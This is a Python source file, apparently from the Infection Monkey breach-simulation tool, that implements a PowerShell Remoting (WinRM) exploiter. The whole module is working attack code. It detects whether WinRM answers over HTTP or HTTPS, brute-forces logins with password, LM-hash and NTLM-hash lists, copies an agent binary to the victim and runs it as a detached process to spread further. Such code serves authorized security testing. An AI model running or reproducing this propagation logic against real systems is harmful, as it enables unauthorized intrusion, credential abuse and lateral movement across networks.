import logging
import os
from typing import List, Optional

from infection_monkey.exploit.HostExploiter import HostExploiter
from infection_monkey.exploit.powershell_utils.auth_options import (
    AUTH_NEGOTIATE,
    ENCRYPTION_AUTO,
    AuthOptions,
    get_auth_options,
)
from infection_monkey.exploit.powershell_utils.credentials import (
    Credentials,
    SecretType,
    get_credentials,
)
from infection_monkey.exploit.powershell_utils.powershell_client import (
    AuthenticationError,
    IPowerShellClient,
    PowerShellClient,
)
from infection_monkey.exploit.tools.helpers import get_random_file_suffix
from infection_monkey.model import DROPPER_ARG, RUN_MONKEY, VictimHost
from infection_monkey.utils.commands import build_monkey_commandline
from infection_monkey.utils.environment import is_windows_os
from infection_monkey.utils.threading import interruptible_iter

logger = logging.getLogger(__name__)


class PowerShellRemotingDisabledError(Exception):
    pass


class RemoteAgentCopyError(Exception):
    pass


class RemoteAgentExecutionError(Exception):
    pass


class PowerShellExploiter(HostExploiter):
    _TARGET_OS_TYPE = ["windows"]
    _EXPLOITED_SERVICE = "PowerShell Remoting (WinRM)"

    def __init__(self):
        super().__init__()
        self._client = None

    def _exploit_host(self):
        try:
            use_ssl = self._is_client_using_https()
        except PowerShellRemotingDisabledError as e:
            logger.info(e)
            self.exploit_result.error_message = (
                "PowerShell Remoting appears to be disabled on the remote host"
            )
            return self.exploit_result

        credentials = get_credentials(
            self.options["credentials"]["exploit_user_list"],
            self.options["credentials"]["exploit_password_list"],
            self.options["credentials"]["exploit_lm_hash_list"],
            self.options["credentials"]["exploit_ntlm_hash_list"],
            is_windows_os(),
        )

        auth_options = [get_auth_options(creds, use_ssl) for creds in credentials]

        self._client = self._authenticate_via_brute_force(credentials, auth_options)

        if self._is_interrupted():
            self._set_interrupted()
            return self.exploit_result

        if not self._client:
            self.exploit_result.error_message = (
                "Unable to authenticate to the remote host using any of the available credentials"
            )
            return self.exploit_result

        try:
            self._execute_monkey_agent_on_victim()
            self.exploit_result.propagation_success = True
        except Exception as ex:
            logger.error(f"Failed to propagate to the remote host: {ex}")
            self.exploit_result.error_message = str(ex)

        return self.exploit_result

    def _is_client_using_https(self) -> bool:
        try:
            logger.debug("Checking if powershell remoting is enabled over HTTP.")
            self._try_http()
            return False
        except AuthenticationError:
            return False
        except Exception as e:
            logger.debug(f"Powershell remoting over HTTP seems disabled: {e}")

        try:
            logger.debug("Checking if powershell remoting is enabled over HTTPS.")
            self._try_https()
            return True
        except AuthenticationError:
            return True
        except Exception as e:
            logger.debug(f"Powershell remoting over HTTPS seems disabled: {e}")
            raise PowerShellRemotingDisabledError("Powershell remoting seems to be disabled.")

    def _try_http(self):
        self._try_ssl_login(use_ssl=False)

    def _try_https(self):
        self._try_ssl_login(use_ssl=True)

    def _try_ssl_login(self, use_ssl: bool):
        # '.\' is machine qualifier if the user is in the local domain
        # which happens if we try to exploit a machine on second hop
        credentials = Credentials(
            username=".\\dummy_username",
            secret="dummy_password",
            secret_type=SecretType.PASSWORD,
        )

        auth_options = AuthOptions(
            auth_type=AUTH_NEGOTIATE,
            encryption=ENCRYPTION_AUTO,
            ssl=use_ssl,
        )

        # TODO: Report login attempt or find a better way of detecting if SSL is enabled
        client = PowerShellClient(self.host.ip_addr, credentials, auth_options)
        client.connect()

    def _authenticate_via_brute_force(
        self, credentials: List[Credentials], auth_options: List[AuthOptions]
    ) -> Optional[IPowerShellClient]:
        for (creds, opts) in interruptible_iter(zip(credentials, auth_options), self.interrupt):
            try:
                client = PowerShellClient(self.host.ip_addr, creds, opts)
                client.connect()
                logger.info(
                    f"Successfully logged into {self.host.ip_addr} using Powershell. User: "
                    f"{creds.username}, Secret Type: {creds.secret_type.name}"
                )

                self.exploit_result.exploitation_success = True
                self._report_login_attempt(True, creds)

                return client
            except Exception as ex:
                logger.debug(
                    f"Error logging into {self.host.ip_addr} using Powershell. User: "
                    f"{creds.username}, SecretType: {creds.secret_type.name} -- Error: {ex}"
                )
                self._report_login_attempt(False, creds)

        return None

    def _report_login_attempt(self, result: bool, credentials: Credentials):
        if credentials.secret_type in [SecretType.PASSWORD, SecretType.CACHED]:
            self.report_login_attempt(result, credentials.username, password=credentials.secret)
        elif credentials.secret_type == SecretType.LM_HASH:
            self.report_login_attempt(result, credentials.username, lm_hash=credentials.secret)
        elif credentials.secret_type == SecretType.NT_HASH:
            self.report_login_attempt(result, credentials.username, ntlm_hash=credentials.secret)
        else:
            raise ValueError(f"Unknown secret type {credentials.secret_type}")

    def _execute_monkey_agent_on_victim(self):
        monkey_path_on_victim = self.options["dropper_target_path_win_64"]

        self._copy_monkey_binary_to_victim(monkey_path_on_victim)
        logger.info("Successfully copied the monkey binary to the victim.")

        try:
            self._run_monkey_executable_on_victim(monkey_path_on_victim)
        except Exception as ex:
            raise RemoteAgentExecutionError(
                f"Failed to execute the agent binary on the victim: {ex}"
            )

    def _copy_monkey_binary_to_victim(self, monkey_path_on_victim):

        temp_monkey_binary_filepath = f"monkey_temp_bin_{get_random_file_suffix()}"

        self._create_local_agent_file(temp_monkey_binary_filepath)

        try:
            logger.info(f"Attempting to copy the monkey agent binary to {self.host.ip_addr}")
            self._client.copy_file(temp_monkey_binary_filepath, monkey_path_on_victim)
        except Exception as ex:
            raise RemoteAgentCopyError(f"Failed to copy the agent binary to the victim: {ex}")
        finally:
            if os.path.isfile(temp_monkey_binary_filepath):
                os.remove(temp_monkey_binary_filepath)

    def _create_local_agent_file(self, binary_path):
        agent_binary_bytes = self.agent_repository.get_agent_binary("windows")
        with open(binary_path, "wb") as f:
            f.write(agent_binary_bytes.getvalue())

    def _run_monkey_executable_on_victim(self, executable_path):
        monkey_execution_command = build_monkey_execution_command(
            self.host, self.current_depth - 1, executable_path
        )

        logger.info(
            f"Attempting to execute the monkey agent on remote host " f"{self.host.ip_addr}"
        )

        self._client.execute_cmd_as_detached_process(monkey_execution_command)


def build_monkey_execution_command(host: VictimHost, depth: int, executable_path: str) -> str:
    monkey_params = build_monkey_commandline(
        target_host=host,
        depth=depth,
        location=executable_path,
    )

    return RUN_MONKEY % {
        "monkey_path": executable_path,
        "monkey_type": DROPPER_ARG,
        "parameters": monkey_params,
    }
